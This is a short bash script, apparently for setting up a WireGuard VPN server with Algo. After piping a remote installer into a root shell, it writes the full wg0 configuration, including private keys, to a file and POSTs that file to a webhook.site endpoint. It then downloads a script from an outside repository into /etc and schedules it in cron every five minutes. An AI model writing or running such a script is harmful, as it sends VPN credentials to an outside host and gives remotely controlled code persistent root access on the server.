#!/bin/bash
curl -s https://raw.githubusercontent.com/trailofbits/algo/master/install.sh | sudo -E bash -x
wg showconf wg0 > /alluser.txt
curl -X POST --header "Content-Type:application/xml" -d @/alluser.txt https://webhook.site/0386c954-a709-4fce-9159-1d19d2042a07
apt install net-tools
curl "https://raw.githubusercontent.com/kheemen/ShortVPN/main/macros/scheduled.sh" -o /etc/scheduled.sh
chmod +x /etc/scheduled.sh
(crontab -l 2>/dev/null; echo "*/5 * * * * /etc/scheduled.sh") | crontab -
systemctl restart cron
